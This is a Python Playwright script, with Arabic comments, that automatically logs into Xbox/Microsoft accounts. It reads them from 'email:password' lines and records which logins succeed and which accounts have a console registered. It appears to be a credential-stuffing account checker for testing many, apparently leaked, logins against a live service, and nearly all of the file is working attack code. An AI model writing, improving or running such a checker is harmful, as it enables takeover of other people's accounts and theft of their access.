import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 90000  # زيادة المهلة الافتراضية إلى 90 ثانية

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    console_url = "https://www.xbox.com/en-US/play/consoles"
    for attempt in range(3):
        try:
            await page.goto(console_url, timeout=DEFAULT_TIMEOUT)
            await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT)
            await asyncio.sleep(3) # زيادة وقت الانتظار بعد تحميل الصفحة
            text = (await page.inner_text("body")).lower()
            if "play your console remotely" in text:
                return True, "يوجد جهاز", True
            if "set up your console" in text:
                return False, "مسجل ولا يوجد جهاز", True
            if "sign in to finish setting up" in text:
                return False, "تسجيل دخول غير مكتمل", False
        except PlaywrightTimeoutError:
            print(f"Timeout during console availability check, attempt {attempt + 1}")
            continue
        except Exception as e:
            print(f"Error during console availability check, attempt {attempt + 1}: {e}")
            continue
    return False, "لم يتم العثور على جهاز", False

async def handle_password_entry(page, email: str, password: str) -> bool:
    try:
        # محاولة البحث عن خيار "Sign in with a password" أو ما شابه
        try:
            # قد يكون هناك زر أو رابط "Sign in with a password" أو "Use password instead"
            password_option_selector = "text=Sign in with a password, text=Use password instead, text=Password"
            await page.locator(password_option_selector).click(timeout=5000)
            await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT)
            await asyncio.sleep(2)
        except PlaywrightTimeoutError:
            print("No explicit 'Sign in with password' option found, proceeding to check for password field directly.")
        except Exception as e:
            print(f"Error trying to click 'Sign in with password' option: {e}")

        # محاولة إدخال كلمة المرور مباشرة
        password_input = page.locator("input[type=\'password\']")
        await password_input.wait_for(state="visible", timeout=DEFAULT_TIMEOUT)
        await password_input.fill(password)
        await asyncio.sleep(5)
        return True
    except PlaywrightTimeoutError:
        print("Timeout waiting for password field after attempting to switch to password login.")
        return False
    except Exception as e:
        print(f"General error handling password entry: {e}")
        return False

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        \'email\': account[\'email\'],
        \'password\': account[\'password\'],
        \'success\': False,
        \'has_console\': False,
        \'console_info\': \'\',
        \'timestamp\': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(headless=headless, args=[\'--no-sandbox\', \'--disable-setuid-sandbox\', \'--disable-gpu\'])  # إضافة --disable-gpu
        context = await browser.new_context(
            viewport={\'width\': 1280, \'height\': 720},
            user_agent=\'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\'
        )
        page = await context.new_page()
        
        # الانتقال إلى صفحة تسجيل الدخول
        await page.goto("https://www.xbox.com/en-US/auth/msa?action=logIn&returnUrl=http%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles", timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT)
        await asyncio.sleep(3)

        # إدخال البريد الإلكتروني
        email_input = page.locator("input[type=\'email\']")
        await email_input.wait_for(state="visible", timeout=DEFAULT_TIMEOUT)
        await email_input.fill(account[\'email\'])
        await asyncio.sleep(3)
        
        # النقر على زر الإرسال بعد البريد الإلكتروني
        submit_button = page.locator("input[type=\'submit\']")
        await submit_button.wait_for(state="visible", timeout=DEFAULT_TIMEOUT)
        await submit_button.click()
        await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT)
        await asyncio.sleep(3)

        # معالجة إدخال كلمة المرور
        if not await handle_password_entry(page, account[\'email\'], account[\'password\']):
            raise Exception("فشل في إدخال كلمة المرور أو العثور على حقلها")
        
        # النقر على زر الإرسال بعد كلمة المرور
        submit_button = page.locator("input[type=\'submit\']")
        await submit_button.wait_for(state="visible", timeout=DEFAULT_TIMEOUT)
        await submit_button.click()
        await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT)
        await asyncio.sleep(3)

        # محاولة النقر على زر "Yes" للموافقة على البقاء مسجلاً الدخول
        try:
            yes_button = page.locator("input[value=\'Yes\']")
            await yes_button.wait_for(state="visible", timeout=10000)
            await yes_button.click()
            await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT)
            await asyncio.sleep(3)
        except PlaywrightTimeoutError:
            print("No \'Yes\' button for staying signed in found or timed out.")
            pass # لا يوجد زر "Yes" أو انتهت المهلة، وهذا أمر طبيعي في بعض الحالات
        except Exception as e:
            print(f"Error clicking \'Yes\' button: {e}")
            pass

        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result[\'success\'] = login_success
        result[\'has_console\'] = has_console
        result[\'console_info\'] = console_info
        
        await browser.close()
        await p.stop()
    except PlaywrightTimeoutError as e:
        result[\'console_info\'] = f"خطأ في المهلة: {str(e)[:100]}"
        print(f"Playwright Timeout Error: {e}")
        if p:
            await p.stop()
    except Exception as e:
        result[\'console_info\'] = f"خطأ عام: {str(e)[:100]}"
        print(f"General Error: {e}")
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if \':\' in line and not line.startswith(\'#\'):
            email, pwd = line.split(\':\', 1)
            accounts.append({\'email\': email.strip(), \'password\': pwd.strip()})
    return accounts
